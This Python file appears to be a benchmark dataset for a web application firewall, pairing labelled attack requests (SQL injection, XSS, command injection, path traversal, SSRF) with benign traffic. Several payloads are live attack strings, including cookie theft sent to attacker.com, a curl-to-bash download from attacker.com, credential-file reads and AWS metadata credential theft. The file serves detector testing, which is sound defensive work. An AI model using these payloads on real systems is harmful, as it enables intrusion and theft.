"""
Curated Security Benchmark Dataset: Real-World Attacks and Realistic Benign HTTP Traffic.
"""

from typing import List
from satguardian_waf.core.payload import HTTPRequestPayload, AttackCategory


CANONICAL_ATTACK_DATASET: List[HTTPRequestPayload] = [
    # --- SQL INJECTION (SQLi) ---
    HTTPRequestPayload(
        id="sqli-01",
        method="POST",
        path="/api/v1/auth/login",
        headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"},
        body="username=admin' OR '1'='1'--&password=secret",
        ground_truth=AttackCategory.SQL_INJECTION,
        description="Classic Boolean Tautology Authentication Bypass",
    ),
    HTTPRequestPayload(
        id="sqli-02",
        method="GET",
        path="/api/v1/products",
        query_params={"category": "1 UNION SELECT username, password, email FROM users--"},
        ground_truth=AttackCategory.SQL_INJECTION,
        description="Union-Based Data Exfiltration Extraction",
    ),
    HTTPRequestPayload(
        id="sqli-03",
        method="POST",
        path="/api/v1/users/search",
        headers={"Content-Type": "application/json"},
        body='{"query": "test\'; DROP TABLE accounts;--"}',
        ground_truth=AttackCategory.SQL_INJECTION,
        description="Stacked Query Destructive Injection",
    ),
    HTTPRequestPayload(
        id="sqli-04",
        method="GET",
        path="/api/v1/item",
        query_params={"id": "105%27%20AND%20SLEEP(5)--%20"},
        ground_truth=AttackCategory.SQL_INJECTION,
        obfuscation_type="URL_ENCODED",
        description="Time-Based Blind SQLi with URL Encoding",
    ),
    HTTPRequestPayload(
        id="sqli-05",
        method="GET",
        path="/api/v1/search",
        query_params={"q": "admin'/**/OR/**/1=1/**/AND/**/'a'='a"},
        ground_truth=AttackCategory.SQL_INJECTION,
        obfuscation_type="COMMENT_INJECTION",
        description="SQLi Comment Obfuscation Filter Bypass",
    ),

    # --- CROSS-SITE SCRIPTING (XSS) ---
    HTTPRequestPayload(
        id="xss-01",
        method="POST",
        path="/api/v1/comments",
        headers={"Content-Type": "application/json"},
        body='{"comment": "<script>alert(document.cookie)</script>"}',
        ground_truth=AttackCategory.CROSS_SITE_SCRIPTING,
        description="Stored Script Tag DOM Cookie Stealer",
    ),
    HTTPRequestPayload(
        id="xss-02",
        method="GET",
        path="/search",
        query_params={"term": "<img src=x onerror=fetch('http://attacker.com/steal?c='+document.cookie)>"},
        ground_truth=AttackCategory.CROSS_SITE_SCRIPTING,
        description="Reflected Image Tag Event-Handler Payload",
    ),
    HTTPRequestPayload(
        id="xss-03",
        method="GET",
        path="/profile/view",
        query_params={"name": "<svg/onload=alert(String.fromCharCode(88,83,83))>"},
        ground_truth=AttackCategory.CROSS_SITE_SCRIPTING,
        obfuscation_type="HEX_ESCAPE",
        description="SVG Inline Event Handler Vector",
    ),
    HTTPRequestPayload(
        id="xss-04",
        method="POST",
        path="/feedback",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        body="msg=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fevil.com%27%3C%2Fscript%3E",
        ground_truth=AttackCategory.CROSS_SITE_SCRIPTING,
        obfuscation_type="URL_ENCODED",
        description="URL-Encoded Redirect Script Injection",
    ),

    # --- REMOTE CODE EXECUTION & COMMAND INJECTION (RCE) ---
    HTTPRequestPayload(
        id="rce-01",
        method="POST",
        path="/api/v1/tools/ping",
        headers={"Content-Type": "application/json"},
        body='{"host": "8.8.8.8; cat /etc/passwd"}',
        ground_truth=AttackCategory.COMMAND_INJECTION,
        description="Semicolon Chained Shell Command Exfiltration",
    ),
    HTTPRequestPayload(
        id="rce-02",
        method="GET",
        path="/api/v1/system/status",
        query_params={"ip": "127.0.0.1 | whoami && id"},
        ground_truth=AttackCategory.COMMAND_INJECTION,
        description="Pipe & Logical AND Privilege Inspection Vector",
    ),
    HTTPRequestPayload(
        id="rce-03",
        method="POST",
        path="/api/v1/deploy",
        headers={"Content-Type": "application/json"},
        body='{"hook": "$(curl -s http://attacker.com/malware.sh | bash)"}',
        ground_truth=AttackCategory.REMOTE_CODE_EXECUTION,
        description="Subshell Expression Download & Execute",
    ),
    HTTPRequestPayload(
        id="rce-04",
        method="POST",
        path="/api/v1/eval",
        headers={"Content-Type": "application/json"},
        body='{"code": "import os; os.system(\'rm -rf /tmp/logs\')"}',
        ground_truth=AttackCategory.REMOTE_CODE_EXECUTION,
        description="Python Dynamic Runtime Code Execution",
    ),

    # --- PATH TRAVERSAL & LOCAL FILE INCLUSION (LFI) ---
    HTTPRequestPayload(
        id="lfi-01",
        method="GET",
        path="/api/v1/download",
        query_params={"file": "../../../../etc/passwd"},
        ground_truth=AttackCategory.PATH_TRAVERSAL,
        description="Canonical Multi-Level Dot-Dot-Slash Traversal",
    ),
    HTTPRequestPayload(
        id="lfi-02",
        method="GET",
        path="/view/doc",
        query_params={"doc": "..%252f..%252f..%252fwindows%252fwin.ini"},
        ground_truth=AttackCategory.PATH_TRAVERSAL,
        obfuscation_type="DOUBLE_ENCODE",
        description="Double URL Encoded Dot-Dot-Slash Windows Bypass",
    ),
    HTTPRequestPayload(
        id="lfi-03",
        method="GET",
        path="/api/v1/read",
        query_params={"path": "/proc/self/environ"},
        ground_truth=AttackCategory.PATH_TRAVERSAL,
        description="Linux Process Memory & Environment Read Attempt",
    ),

    # --- SERVER-SIDE REQUEST FORGERY (SSRF) ---
    HTTPRequestPayload(
        id="ssrf-01",
        method="POST",
        path="/api/v1/fetch-url",
        headers={"Content-Type": "application/json"},
        body='{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}',
        ground_truth=AttackCategory.SSRF,
        description="AWS EC2 Metadata Service Credential Theft",
    ),
    HTTPRequestPayload(
        id="ssrf-02",
        method="GET",
        path="/api/v1/proxy",
        query_params={"target": "http://127.0.0.1:6379/flushall"},
        ground_truth=AttackCategory.SSRF,
        description="Localhost Redis Internal Database Purge Probe",
    ),

    # --- BENIGN NORMAL WEB TRAFFIC (0% FALSE POSITIVE BENCHMARK) ---
    HTTPRequestPayload(
        id="benign-01",
        method="GET",
        path="/api/v1/products",
        query_params={"category": "electronics", "sort": "price_asc", "page": "2"},
        ground_truth=AttackCategory.BENIGN,
        description="Standard E-Commerce Product Catalog Filter",
    ),
    HTTPRequestPayload(
        id="benign-02",
        method="POST",
        path="/api/v1/checkout",
        headers={"Content-Type": "application/json", "Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9..."},
        body='{"cart_id": "cart_88392", "coupon_code": "SUMMER_SALE_2026", "shipping_address": "123 Main St, Apt 4B"}',
        ground_truth=AttackCategory.BENIGN,
        description="Legitimate Shopping Cart Checkout with Coupon",
    ),
    HTTPRequestPayload(
        id="benign-03",
        method="GET",
        path="/search",
        query_params={"q": "How to learn SQL in 2026 & Python for Beginners"},
        ground_truth=AttackCategory.BENIGN,
        description="Search Query containing keywords 'SQL' and 'Python'",
    ),
    HTTPRequestPayload(
        id="benign-04",
        method="POST",
        path="/api/v1/articles/comment",
        headers={"Content-Type": "application/json"},
        body='{"article_id": 104, "author": "Dr. Alan Turing", "text": "The script of the movie was great. I loved the character depth & direction!"}',
        ground_truth=AttackCategory.BENIGN,
        description="User Comment containing benign words 'script' and 'character'",
    ),
    HTTPRequestPayload(
        id="benign-05",
        method="GET",
        path="/healthz",
        headers={"User-Agent": "Kubernetes-Prober/1.28"},
        ground_truth=AttackCategory.BENIGN,
        description="Internal Kubernetes Cluster Health Probe",
    ),
]


def get_benchmark_dataset() -> List[HTTPRequestPayload]:
    """Returns the standardized benchmark suite."""
    return list(CANONICAL_ATTACK_DATASET)


def generate_synthetic_attack_stream(num_requests: int = 100, attack_ratio: float = 0.5, seed: int = 42) -> List[HTTPRequestPayload]:
    """Generates a synthetic evaluation stream with a specified attack/benign ratio."""
    import random
    rng = random.Random(seed)

    attacks = [p for p in CANONICAL_ATTACK_DATASET if p.expected_category != AttackCategory.BENIGN]
    benigns = [p for p in CANONICAL_ATTACK_DATASET if p.expected_category == AttackCategory.BENIGN]

    stream: List[HTTPRequestPayload] = []
    num_attacks = int(num_requests * attack_ratio)
    num_benign = num_requests - num_attacks

    for i in range(num_attacks):
        base = rng.choice(attacks)
        stream.append(HTTPRequestPayload(
            id=f"synth-atk-{i:04d}",
            name=base.name or base.description,
            method=base.method,
            path=base.path,
            query_string=base.query_string,
            query_params=dict(base.query_params),
            headers=dict(base.headers),
            body=base.body,
            expected_category=base.expected_category,
            ground_truth=base.expected_category,
            description=base.description,
            is_obfuscated=base.is_obfuscated,
            tags=base.tags
        ))

    for i in range(num_benign):
        base = rng.choice(benigns)
        stream.append(HTTPRequestPayload(
            id=f"synth-ben-{i:04d}",
            name=base.name or base.description,
            method=base.method,
            path=base.path,
            query_string=base.query_string,
            query_params=dict(base.query_params),
            headers=dict(base.headers),
            body=base.body,
            expected_category=AttackCategory.BENIGN,
            ground_truth=AttackCategory.BENIGN,
            description=base.description,
            is_obfuscated=False,
            tags=base.tags
        ))

    rng.shuffle(stream)
    return stream

